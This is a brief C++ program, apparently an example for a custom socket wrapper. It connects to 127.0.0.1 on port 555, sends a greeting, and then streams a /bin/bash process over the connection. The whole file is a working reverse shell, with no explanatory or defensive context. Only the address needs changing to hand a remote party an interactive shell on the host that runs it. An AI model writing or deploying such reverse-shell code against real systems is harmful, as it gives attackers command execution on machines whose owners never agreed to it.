#include "headers/socket.hxx"

using namespace std;

int main(){
    LinSocket l(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if (l.Connect("127.0.0.1",555) != SOCKET_ERROR)
    {
        l.SendTimeout("Hello World",1,0); // Wait For 1 seconds
        l.ExecuteAndStreamProcess("/bin/bash");
    }
    return 0;
}
